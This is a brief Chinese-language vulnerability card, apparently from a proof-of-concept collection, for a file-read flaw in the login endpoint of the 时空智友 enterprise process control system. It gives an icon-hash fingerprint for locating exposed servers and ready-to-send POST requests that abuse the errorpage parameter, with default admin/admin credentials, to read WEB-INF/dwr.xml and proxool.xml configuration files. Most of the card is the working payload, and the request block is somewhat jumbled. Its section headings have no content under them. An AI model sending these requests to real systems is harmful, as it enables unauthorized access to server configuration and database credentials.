# 时空智友企业流程化管控系统login文件读取漏洞

- **系统**：时空智友企业流程化管控系统login　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`web.icon=="2464cbce5dd2681dd4fb62d055520d78"`
- **请求**：`POST /login HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 100`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
op=verify%7Clogin&targetpage=&errorpage=/WEB-INF/dwr.xml&mark=&tzo=480&username=admin&password=admin
POST /login HTTP/1.1
Host: XX.XX.XX.XX
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
op=verify%7Clogin&targetpage=&errorpage=WEB-INF/classes/proxool.xml&mark=&tzo=480&username=admin&password=admin
```

**其他**
- 时空智友企业流程化管控系统 login 文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 时空智友企业流程化管控系统